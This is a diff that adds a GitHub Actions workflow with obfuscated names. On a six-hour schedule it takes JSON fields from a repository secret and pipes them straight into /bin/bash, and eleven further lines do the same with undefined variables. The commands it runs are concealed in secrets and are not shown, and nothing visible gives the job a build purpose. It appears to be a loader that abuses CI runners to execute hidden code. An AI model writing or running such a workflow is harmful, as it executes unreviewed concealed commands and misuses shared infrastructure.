@@ -1,0 +1,28 @@
+name: luyuhuan4567
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: luyuhuan4567
+        env:
+          fd4: ${{ secrets.fd4 }}
+        run: |
+          echo $fd4 | jq -r .pqhmk48 | /bin/bash
+          echo $pvk01 | jq -r .cde0 | /bin/bash
+          echo $ybc34 | jq -r .ui70263 | /bin/bash
+          echo $cyx126 | jq -r .qhlt91860 | /bin/bash
+          echo $h3659 | jq -r .ozsud6108 | /bin/bash
+          echo $y989 | jq -r .mapkc42650 | /bin/bash
+          echo $z750 | jq -r .htty031 | /bin/bash
+          echo $vxji08 | jq -r .w5901 | /bin/bash
+          echo $ml137 | jq -r .j8 | /bin/bash
+          echo $oxs39 | jq -r .jlu2468 | /bin/bash
+          echo $psq9473 | jq -r .jo34 | /bin/bash
+          echo $f899 | jq -r .a18949 | /bin/bash
+
